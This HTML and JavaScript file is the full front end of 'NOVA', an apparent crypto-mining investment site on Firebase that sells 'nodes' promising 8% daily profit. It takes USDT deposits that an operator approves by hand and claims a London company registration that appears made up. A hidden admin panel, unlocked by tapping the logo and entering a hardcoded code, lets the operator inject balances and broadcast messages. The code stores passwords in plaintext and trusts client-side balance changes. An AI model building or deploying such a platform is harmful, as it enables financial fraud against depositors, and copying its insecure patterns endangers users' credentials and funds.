<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Institutional Global</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --n-gold: #D4AF37; --n-black: #0F172A; --n-bg: #F8FAFC; }
        body { background: var(--n-bg); font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; overflow-x: hidden; }
        .nova-card { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 20px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.05); }
        .btn-gold { background: linear-gradient(135deg, #B8860B, #D4AF37); color: white; border-radius: 12px; font-weight: 700; transition: 0.3s; text-transform: uppercase; font-size: 11px; }
        .btn-gold:active { transform: scale(0.95); }
        .screen { display: none; padding-bottom: 100px; animation: slideUp 0.4s ease-out; }
        .active-screen { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: white; border-top: 1px solid #f1f5f9; display: flex; justify-content: space-around; padding: 15px; z-index: 100; }
        .nav-item { color: #94a3b8; font-size: 10px; font-weight: 700; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .nav-item.active { color: #B8860B; }
        .p-input { background: #f1f5f9; border: 1px solid transparent; width: 100%; padding: 14px; border-radius: 12px; outline: none; margin-bottom: 10px; font-size: 13px; }
        .p-input:focus { border-color: #D4AF37; background: #fff; }
        .modal { display: none; position: fixed; inset: 0; background: white; z-index: 1000; padding: 20px; overflow-y: auto; }
        .broadcast-bar { background: #0F172A; color: #D4AF37; padding: 10px; font-size: 11px; font-weight: 600; text-align: center; }
    </style>
</head>
<body>

    <div id="global-msg" class="broadcast-bar hidden"></div>

    <div id="auth-screen" class="min-h-screen flex flex-col p-8 justify-center active-screen bg-white">
        <div class="mb-10 text-center">
            <h1 onclick="handleTaps()" class="text-4xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[10px] text-gray-400 font-bold uppercase tracking-[4px] mt-2">Institutional Mining Core</p>
        </div>
        <div class="nova-card p-6 mb-8 bg-slate-50 border-slate-100">
            <h2 class="text-xs font-bold text-slate-800 mb-2">Institutional Welcome,</h2>
            <p class="text-[11px] text-slate-500 leading-relaxed">Access the world's most advanced hash-rate distribution network. Your assets are secured by NOVA's multi-layer encryption.</p>
        </div>
        <div class="space-y-1">
            <input type="text" id="u-id" placeholder="Access ID / Email" class="p-input">
            <input type="password" id="u-pw" placeholder="Security Passkey" class="p-input">
            <input type="text" id="adm-key" placeholder="System Master Code" class="hidden p-input border-[#D4AF37]">
            <button onclick="auth()" class="w-full btn-gold py-4 shadow-lg shadow-yellow-600/20 mt-4">Initialize Session</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[10px] mt-8 text-slate-400 font-bold uppercase cursor-pointer">Establish New Node</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-4 flex justify-between items-center bg-white border-b sticky top-0 z-50">
            <h2 class="font-black text-xl tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="flex items-center gap-4">
                <a id="tg-link" href="#" target="_blank" class="text-sky-500 text-lg"><i class="fa-brands fa-telegram"></i></a>
                <i onclick="logout()" class="fa-solid fa-power-off text-slate-300"></i>
            </div>
        </header>

        <div id="dash-screen" class="screen active-screen px-4 pt-4">
            <div class="nova-card p-8 mb-4 text-center bg-slate-900 text-white relative overflow-hidden">
                <div class="relative z-10">
                    <p class="text-[9px] text-slate-400 font-bold uppercase tracking-widest mb-2">Available Liquidity</p>
                    <h1 id="main-bal" class="text-4xl font-extrabold tracking-tighter text-[#D4AF37]">$0.00</h1>
                    <p id="v-daily" class="text-[10px] font-bold text-green-400 mt-4 uppercase">Yield Configured: +$0.00 / 24H</p>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-3 mb-4">
                <button onclick="openModal('dep-modal')" class="nova-card p-5 flex items-center gap-3"><i class="fa-solid fa-plus-circle text-[#D4AF37]"></i><span class="text-[10px] font-bold uppercase">Deposit</span></button>
                <button onclick="openModal('wd-modal')" class="nova-card p-5 flex items-center gap-3"><i class="fa-solid fa-wallet text-slate-400"></i><span class="text-[10px] font-bold uppercase">Withdraw</span></button>
            </div>

            <div class="nova-card p-5 mb-4 flex justify-between items-center">
                <div>
                    <p class="text-[9px] font-bold text-slate-400 uppercase">Daily Bonus Reward</p>
                    <p class="text-xs font-bold">$0.10 - $0.50 Range</p>
                </div>
                <button id="bonus-btn" onclick="claimBonus()" class="btn-gold px-4 py-2">Claim</button>
            </div>

            <div class="nova-card p-5 mb-4">
                <div class="flex gap-2">
                    <input type="text" id="promo-inp" placeholder="VOUCHER CODE" class="p-input mb-0 py-2 text-[10px]">
                    <button onclick="applyPromo()" class="btn-gold px-4">Redeem</button>
                </div>
            </div>
            
            <div class="nova-card p-5 bg-slate-50 border-dashed border-2">
                <h3 class="text-[10px] font-black uppercase mb-1">Company Details</h3>
                <p class="text-[9px] text-slate-500 leading-relaxed">NOVA Global is a certified ASIC cluster provider. Registered in London (Reg #09921). All payouts are processed via smart-contracts.</p>
            </div>
        </div>

        <div id="mine-screen" class="screen px-4 pt-4">
            <h2 class="text-lg font-black mb-4 uppercase">Node <span class="text-[#D4AF37]">Deployment</span></h2>
            <div id="nodes-container" class="space-y-4"></div>
        </div>

        <div id="hist-screen" class="screen px-4 pt-4">
            <h2 class="text-lg font-black mb-4 uppercase">Audit <span class="text-[#D4AF37]">History</span></h2>
            <div id="hist-container" class="space-y-2"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active" id="nav-dash"><i class="fa-solid fa-grid-2 text-lg"></i><span>CORE</span></div>
            <div onclick="nav('mine-screen')" class="nav-item" id="nav-mine"><i class="fa-solid fa-microchip text-lg"></i><span>NODES</span></div>
            <div onclick="nav('hist-screen')" class="nav-item" id="nav-hist"><i class="fa-solid fa-clock-rotate-left text-lg"></i><span>AUDIT</span></div>
        </nav>
    </div>

    <div id="dep-modal" class="modal">
        <button onclick="closeModal('dep-modal')" class="mb-5 font-bold text-xs uppercase text-slate-400"><i class="fa-solid fa-arrow-left mr-2"></i>Close</button>
        <h2 class="text-2xl font-black mb-6">FUNDING</h2>
        <p class="text-[10px] font-bold text-slate-400 mb-2">NETWORK: USDT TRC20</p>
        <div class="nova-card p-4 bg-slate-50 mb-6 text-center">
            <p id="dep-addr" class="text-[10px] font-mono break-all font-bold">TX_ADDRESS_HERE_0x992...</p>
        </div>
        <input type="number" id="dep-amt" placeholder="Amount ($)" class="p-input">
        <input type="text" id="dep-tid" placeholder="Transaction ID (TID)" class="p-input">
        <button onclick="reqFin('Deposit')" class="w-full btn-gold py-4">Confirm Deposit</button>
    </div>

    <div id="wd-modal" class="modal">
        <button onclick="closeModal('wd-modal')" class="mb-5 font-bold text-xs uppercase text-slate-400"><i class="fa-solid fa-arrow-left mr-2"></i>Close</button>
        <h2 class="text-2xl font-black mb-6">WITHDRAWAL</h2>
        <input type="number" id="wd-amt" placeholder="Amount ($)" class="p-input">
        <input type="text" id="wd-acc" placeholder="Address / Account" class="p-input">
        <button onclick="reqFin('Withdrawal')" class="w-full btn-gold py-4 bg-slate-900">Request Extraction</button>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-white z-[9999] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-6 pb-4 border-b">
            <h2 class="font-black text-xs uppercase">NOVA Admin Engine</h2>
            <button onclick="location.reload()" class="text-red-500 font-bold text-[10px]">EXIT</button>
        </div>
        
        <div class="space-y-6">
            <div class="nova-card p-4 bg-slate-50">
                <h3 class="text-[10px] font-black mb-3">GLOBAL BROADCAST</h3>
                <input type="text" id="adm-msg" placeholder="Message text..." class="p-input text-[11px]">
                <button onclick="sendGlobal()" class="w-full btn-gold py-2">Broadcast Live</button>
            </div>

            <div class="nova-card p-4 bg-slate-50">
                <h3 class="text-[10px] font-black mb-3">MANAGE BALANCES</h3>
                <input type="text" id="adm-uid" placeholder="User ID" class="p-input text-[11px]">
                <input type="number" id="adm-amt" placeholder="Amount to Inject" class="p-input text-[11px]">
                <button onclick="injectBal()" class="w-full btn-gold py-2">Update Balance</button>
            </div>

            <div>
                <h3 class="text-[10px] font-black mb-3">PENDING REQUESTS</h3>
                <div id="adm-requests" class="space-y-3"></div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const config = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(config); const db = getFirestore(app);
        let user = localStorage.getItem('nova_user'); let login = true;

        if(user) start(user);

        window.auth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(document.getElementById('adm-key').value === "nov786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); return; }
            if(!id || !pw) return alert("Fill credentials");
            const uRef = doc(db, "users", id); const s = await getDoc(uRef);
            if(!login) {
                if(s.exists()) return alert("User exists");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, bonusClaimed: false, promoUsed: false });
                localStorage.setItem('nova_user', id); start(id);
            } else if(s.exists() && s.data().password === pw) {
                localStorage.setItem('nova_user', id); start(id);
            } else alert("Invalid credentials");
        };

        function start(id) {
            user = id; document.getElementById('auth-screen').style.display='none'; document.getElementById('app').classList.remove('hidden');
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                document.getElementById('main-bal').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "Yield Configured: +$" + (data.daily || 0).toFixed(2) + " / 24H";
                if(data.bonusClaimed) { document.getElementById('bonus-btn').disabled = true; document.getElementById('bonus-btn').innerText = "Claimed"; }
            });
            onSnapshot(doc(db, "settings", "global"), d => {
                if(d.exists() && d.data().msg) { document.getElementById('global-msg').innerText = d.data().msg; document.getElementById('global-msg').classList.remove('hidden'); }
            });
            loadNodes(); loadHistory();
        }

        function loadNodes() {
            const c = document.getElementById('nodes-container'); c.innerHTML = "";
            for(let i=1; i<=20; i++) {
                let price = i === 1 ? 20 : (i === 20 ? 20000 : i * 500); 
                let profit = (price * 0.08).toFixed(2);
                c.innerHTML += `<div class="nova-card p-5 flex justify-between items-center">
                    <div><h4 class="text-[10px] font-black uppercase">NOVA UNIT v.${i}</h4><p class="text-[9px] text-slate-400 font-bold">Profit: $${profit}/Day</p></div>
                    <div class="flex items-center gap-3"><span class="text-xs font-black">$${price}</span><button onclick="buyNode(${price},${profit})" class="btn-gold px-4 py-2">Deploy</button></div>
                </div>`;
            }
        }

        window.buyNode = async (p, d) => {
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(s.data().balance < p) return alert("Insufficient Liquidity");
            await updateDoc(uR, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Node Deployed!");
        };

        window.claimBonus = async () => {
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(s.data().bonusClaimed) return;
            const b = (Math.random() * (0.50 - 0.10) + 0.10).toFixed(2);
            await updateDoc(uR, { balance: s.data().balance + parseFloat(b), bonusClaimed: true });
            alert(`Daily Bonus of $${b} claimed!`);
        };

        window.applyPromo = async () => {
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(s.data().promoUsed) return alert("One time use only!");
            const code = document.getElementById('promo-inp').value;
            const pRef = doc(db, "settings", "promo"); const ps = await getDoc(pRef);
            if(ps.exists() && ps.data().code === code) {
                await updateDoc(uR, { balance: s.data().balance + ps.data().val, promoUsed: true });
                alert("Promo Applied!");
            } else alert("Invalid Code");
        };

        window.reqFin = async (type) => {
            const amt = parseFloat(document.getElementById(type=='Deposit'?'dep-amt':'wd-amt').value);
            if(!amt) return alert("Invalid Amount");
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(type === 'Withdrawal' && s.data().balance < amt) return alert("Low balance");
            if(type === 'Withdrawal') await updateDoc(uR, { balance: s.data().balance - amt });
            await addDoc(collection(db, "logs"), { user, type, amount: amt, status: 'Pending', time: Date.now(), ref: type=='Deposit'?document.getElementById('dep-tid').value:document.getElementById('wd-acc').value });
            alert("Request Submitted"); closeModal(type=='Deposit'?'dep-modal':'wd-modal');
        };

        function loadHistory() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", user), orderBy("time", "desc")), s => {
                const c = document.getElementById('hist-container'); c.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    c.innerHTML += `<div class="nova-card p-4 flex justify-between items-center">
                        <div><p class="text-[8px] font-black text-slate-400 uppercase">${r.type}</p><p class="text-xs font-bold">$${r.amount}</p></div>
                        <span class="text-[9px] font-black ${r.status=='Success'?'text-green-500':'text-orange-400'} uppercase">${r.status}</span>
                    </div>`;
                });
            });
        }

        // 👑 ADMIN LOGIC
        function loadAdmin() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const c = document.getElementById('adm-requests'); c.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    c.innerHTML += `<div class="nova-card p-4 bg-white border-l-4 ${r.type=='Deposit'?'border-green-500':'border-red-500'}">
                        <p class="text-[10px] font-black">${r.user} | $${r.amount}</p>
                        <p class="text-[8px] text-slate-400 mb-3">${r.type} Ref: ${r.ref}</p>
                        <div class="flex gap-2">
                            <button onclick="admAct('${d.id}','${r.user}',${r.amount},'${r.type}','Success')" class="bg-green-500 text-white text-[8px] font-bold px-3 py-2 rounded">APPROVE</button>
                            <button onclick="admAct('${d.id}','${r.user}',${r.amount},'${r.type}','Rejected')" class="bg-red-500 text-white text-[8px] font-bold px-3 py-2 rounded">REJECT</button>
                        </div>
                    </div>`;
                });
            });
        }

        window.admAct = async (id, u, a, t, s) => {
            if(s === 'Success' && t === 'Deposit') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); }
            if(s === 'Rejected' && t === 'Withdrawal') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); }
            await updateDoc(doc(db, "logs", id), { status: s });
        };

        window.sendGlobal = async () => { await setDoc(doc(db, "settings", "global"), { msg: document.getElementById('adm-msg').value }); alert("Broadcast Sent!"); };
        window.injectBal = async () => { const uR = doc(db, "users", document.getElementById('adm-uid').value.toLowerCase().trim()); const s = await getDoc(uR); if(s.exists()) { await updateDoc(uR, { balance: s.data().balance + parseFloat(document.getElementById('adm-amt').value) }); alert("Balance Updated!"); } };

        window.logout = () => { localStorage.removeItem('nova_user'); location.reload(); };
        window.handleTaps = () => { window.taps = (window.taps || 0) + 1; if(window.taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { login = !login; document.getElementById('m-text').innerText = login ? "Establish New Node" : "Back to Security Access"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('nav-' + id.split('-')[0]).classList.add('active');
        };
    </script>
</body>
</html>
